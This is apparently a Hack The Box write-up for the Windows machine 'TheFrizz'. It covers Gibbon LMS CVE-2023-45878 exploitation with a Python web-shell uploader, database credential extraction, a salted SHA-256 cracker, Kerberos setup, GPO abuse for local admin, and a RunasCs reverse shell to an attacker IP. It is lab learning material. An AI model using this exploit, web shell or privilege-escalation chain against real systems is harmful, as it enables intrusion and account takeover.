```json
Alias: TheFrizz
Date: 03-04_2025
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.10.11.60
```

# TheFrizz
# Summary

NTLM Authentication disabled and Group Policy Abuse.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-03 20:55 PKT
Nmap scan report for 10.10.11.60
Host is up (0.17s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-03 22:56:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time:
|   date: 2025-04-03T22:56:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.47 seconds

```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration

The Gibbon-LMS login page contains the text

```
*NOTICE** Due to unplanned Pentesting by students, WES is migrating applications and tools to stronger security protocols. During this transition, Ms. Fiona Frizzle will be migrating Gibbon to utilize our Azure Active Directory SSO. Please note this might take 48 hours where your accounts will not be available. Please bear with us, and thank you for your patience. Anything that can not utilize Azure AD will use the strongest available protocols such as Kerberos.
```

Saving

```
Ms. Fiona Frizzle
Fiona Frizzle
```

to a file, and using username anarchy

```bash
./username-anarchy -i file
```

We get a list of usernames, and trying them out with `kerbrute`

```bash
kerbrute userenum -d frizz.htb --dc $IP file --hash-file valid_asrep --downgrade
```

We get the user: `f.frizzle@frizz.htb`.

The version of gibbon running is vulnerable to CVE-2023-45878. An arbitrary file write vulnerabilty.

probably should've focused on this before the stuff above, but whatever method is still good for other CTFs.


---

# Exploitation


```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

`config.php` on the web root contains

```
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

With this we can access the database, use `C:\xampp\mysql\bin\mysql.exe` to do that.

The credentials in the database can be retrieved as such:

```bash
./mysql.exe -u 'MrGibbonsDB' -p'MisterGibbs!Parrot!?1' -e 'SELECT * FROM gibbon.gibbonperson'
```

Going through the Gibbon git, I found out that `sha256` is being used for the password with the salt being but at the start of the word before encryption like this: `sha256(salt + password)`

So I wrote some quick code to crack it

```c#
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class PasswordCracker
{
    static void Main(string[] args)
    {
        if (args.Length != 3)
        {
            Console.WriteLine("Usage: dotnet run <targetHash> <salt> <wordlistPath>");
            return;
        }

        string targetHash = args[0].ToLower();
        string salt = args[1];
        string wordlistPath = args[2];

        if (!File.Exists(wordlistPath))
        {
            Console.WriteLine($"Wordlist file not found: {wordlistPath}");
            return;
        }

        Console.WriteLine($"[*] Starting password cracking...");

        foreach (var word in File.ReadLines(wordlistPath))
        {
            string candidate = salt + word.Trim();
            string hash = ComputeSha256Hash(candidate);

            if (hash.Equals(targetHash, StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine($"[+] Password found: {word}");
                return;
            }
        }

        Console.WriteLine("[-] Password not found in wordlist.");
    }

    static string ComputeSha256Hash(string rawData)
    {
        using (SHA256 sha256Hash = SHA256.Create())
        {
            byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

            StringBuilder builder = new StringBuilder();
            foreach (byte b in bytes)
            {
                builder.Append(b.ToString("x2"));
            }
            return builder.ToString();
        }
    }
}
```

With this we get the user:

| Username  | Password           |
| --------- | ------------------ |
| f.frizzle | Jenni_Luvs_Magic23 |

But since we can't use NTLM authentication (As stated in the note we found). We need to setup kerberos authentication, for that setup your `/etc/krb5.conf`:

```
[libdefaults]
        default_realm = frizz.htb
        dns_lookup_realm = false
        dns_lookup_kdc = false
[realms]
        FRIZZ.HTB = {
                kdc = frizzdc.frizz.htb
                admin_server = frizzdc.frizz.htb
        }
[domain_realm]
        .frizz.htb = FRIZZ.HTB
        frizz.htb = FRIZZ.HTB
```

Sync time with the box

```bash
sudo timedatectl set-ntp off
sudo ntpdate $IP
```

Request a TGT.

```bash
getTGT.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip $IP
cp f.frizzle.ccache /tmp/krb5cc_1000
export KRB5CCNAME=/tmp/krb5cc_1000
```

We can then ssh to the box,

```bash
ssh f.frizzle@frizz.htb -K
```

---

# Lateral Movement

Look in the recycle bin:

```powershell
$shell = New-Object -ComObject Shell.Application  
$recycleBin = $shell.Namespace(0xA)  
$recycleBin.items() | Select-Object Name, Path
```

We see a file, restore it to MyDocuments:

```powershell
$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)  
$items = $recycleBin.Items()  
$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}  
$documentsPath = [Environment]::GetFolderPath("MyDocuments")  
$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)  
$documents.MoveHere($item)
```

Download it use 7zip to extract and get credentials from the file `conf/waptserver.ini`

| Username    | Password         |
| ----------- | ---------------- |
| m.schoolbus | !suBcig@MehTed!R |

Next get TGT and SSH.

---

# Privilege Escalation

The Attack Vector relies on the fact that we can create GPOs:

![[Pasted image 20250407031712.png]]

And also that we have WriteGPLink permissions over the Domain Controllers OU

![[Pasted image 20250407031828.png]]

This means, that we can create a GPO making ourselves a local admin and link it the above OU, effectively making ourselves the admins of all machine accounts that are present in the OU.

Create and link the GPO:

```powershell
New-GPO -Name "MegaPwnedGPO" | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
```

use https://github.com/byronkg/SharpGPOAbuse/blob/main/SharpGPOAbuse-master/SharpGPOAbuse.exe to make ourselves local admin

```powershell
.\sharpgpo.exe --AddLocalAdmin --UserAccount m.schoolbus --GPOName "MegaPwnedGPO"
```

use RunasCs.exe to get a reverse shell

```powershell
.\Runascs.exe "m.schoolbus" "!suBcig@MehTed!R" powershell.exe -r 10.10.14.115:4444
```

---

# Flags
- 4e77ba3c546d03f101ebd2974bf07893
- b6129df7aa9da6e8b35d98bf9dd9f5a8

#CTF